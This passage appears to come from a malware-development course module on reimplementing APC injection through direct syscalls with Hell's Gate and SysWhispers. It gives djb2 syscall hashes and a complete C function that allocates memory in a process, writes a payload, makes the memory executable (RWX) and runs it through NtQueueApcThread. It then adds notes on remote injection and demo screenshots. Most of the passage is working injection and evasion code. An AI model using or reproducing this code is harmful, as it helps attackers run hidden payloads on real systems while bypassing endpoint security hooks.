</code></pre><p id="76d2cf74-3205-446b-a3d7-57cedc6f5776" class="">Once the values are generated, add them to the start of the Hell&#x27;s Gate project.</p><pre id="c1a798f5-6e33-4ebb-a5ad-3c921dbece1f" class="code code-wrap"><code>#define NtAllocateVirtualMemory_djb2 0x7B2D1D431C81F5F6#define NtWriteVirtualMemory_djb2    0x54AEE238645CCA7C#define NtProtectVirtualMemory_djb2  0xA0DCC2851566E832#define NtQueueApcThread_djb2        0x331E6B6B7E696022</code></pre><h3 id="d06cfdc1-b94b-40ed-b929-4576e19c9771" class=""><strong>Updating The Main Function</strong></h3><p id="1918aa89-03a0-4f43-b8ea-87d8207acf4c" class="">The main function must be updated to use the <code>ApcInjectionViaSyscalls</code> function instead of the <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L80">payload function</a>. The function will use the above-generated hashes as shown below.</p><pre id="c0581dc4-4e50-4d9f-a454-fc02d123f79e" class="code code-wrap"><code>
BOOL ApcInjectionViaSyscalls(IN PVX_TABLE pVxTable, IN HANDLE hProcess, IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

	Syscall     St                      = { 0 };
	NTSTATUS    STATUS                  = NULL;
	PVOID       pAddress                = NULL;
	ULONG       uOldProtection          = NULL;
	SIZE_T      sSize                   = sPayloadSize,
	            sNumberOfBytesWritten   = NULL;

	// Allocating memory
	HellsGate(pVxTable-&gt;NtAllocateVirtualMemory.wSystemCall);
	if ((STATUS = HellDescent(hProcess, &amp;pAddress, 0, &amp;sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
		printf(&quot;[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
		return FALSE;
	}
	printf(&quot;[+] Allocated Address At : 0x%p Of Size : %d \n&quot;, pAddress, sSize);

//--------------------------------------------------------------------------

	// Writing the payload
	printf(&quot;[#] Press &lt;Enter&gt; To Write The Payload ... &quot;);
	getchar();
	printf(&quot;\t[i] Writing Payload Of Size %d ... &quot;, sPayloadSize);
	HellsGate(pVxTable-&gt;NtWriteVirtualMemory.wSystemCall);
	if ((STATUS = HellDescent(hProcess, pAddress, pPayload, sPayloadSize, &amp;sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {
		printf(&quot;[!] pNtWriteVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
		printf(&quot;[i] Bytes Written : %d of %d \n&quot;, sNumberOfBytesWritten, sPayloadSize);
		return FALSE;
	}
	printf(&quot;[+] DONE \n&quot;);

//--------------------------------------------------------------------------

	// Changing the memory&#x27;s permissions to RWX
	HellsGate(pVxTable-&gt;NtProtectVirtualMemory.wSystemCall);
	if ((STATUS = HellDescent(hProcess, &amp;pAddress, &amp;sPayloadSize, PAGE_EXECUTE_READWRITE, &amp;uOldProtection)) != 0) {
		printf(&quot;[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
		return FALSE;
	}

//--------------------------------------------------------------------------

	// Executing the payload via NtQueueApcThread

	printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
	getchar();
	printf(&quot;\t[i] Running Payload At 0x%p Using Thread Of Id : %d ... &quot;, pAddress, GetThreadId(hThread));
	HellsGate(pVxTable-&gt;NtQueueApcThread.wSystemCall);
	if ((STATUS = HellDescent(hThread, pAddress, NULL, NULL, NULL)) != 0) {
		printf(&quot;[!] NtQueueApcThread Failed With Error : 0x%0.8X \n&quot;, STATUS);
		return FALSE;
	}
	printf(&quot;[+] DONE \n&quot;);


	return TRUE;
}
</code></pre><h3 id="8984e68a-9f6f-47dc-b251-fab74f6ac334" class=""><strong>Remote Injection</strong></h3><p id="e0c55e21-a0f1-4189-9e72-a8e231b3d17c" class="">It&#x27;s possible to use the <code>ApcInjectionViaSyscalls</code> function for remote process injection but to do so a suspended process must be created. This approach was discussed in the <em>Early Bird APC Queue Code Injection</em> module.</p><h3 id="21a9dcdd-6606-413c-9e5f-5e780775bd81" class=""><strong>Demo</strong></h3><p id="be1c06b1-a231-4cac-b748-6ae53b2d5940" class="">Using SysWhispers implementation.</p><figure id="a38428b0-c354-424c-994b-87fa7cfde93e" class="image"><a href="69%20Syscalls%20-%20Reimplementing%20APC%20Injection%204134d6cae4f8487384888ad519adc700/syscall-apc-114387928-a6054f8c-8590-49cb-a97e-6eb4d7e2870e.png"><img style="width:1881px" src="69%20Syscalls%20-%20Reimplementing%20APC%20Injection%204134d6cae4f8487384888ad519adc700/syscall-apc-114387928-a6054f8c-8590-49cb-a97e-6eb4d7e2870e.png"/></a></figure><p id="7dff9861-e795-408a-b5a4-b6d7174fe8dd" class="">Using Hell&#x27;s Gate implementation.</p><figure id="db1f6b7d-3821-4646-984f-0d916f62a8f1" class="image"><a href="69%20Syscalls%20-%20Reimplementing%20APC%20Injection%204134d6cae4f8487384888ad519adc700/syscall-apc-214388088-5de280c3-8fd2-4546-9127-c058c373757b.png"><img style="width:1845px" src="69%20Syscalls%20-%20Reimplementing%20APC%20Injection%204134d6cae4f8487384888ad519adc700/syscall-apc-214388088-5de280c3-8fd2-4546-9127-c058c373757b.png"/></a></figure></div></article></body></html>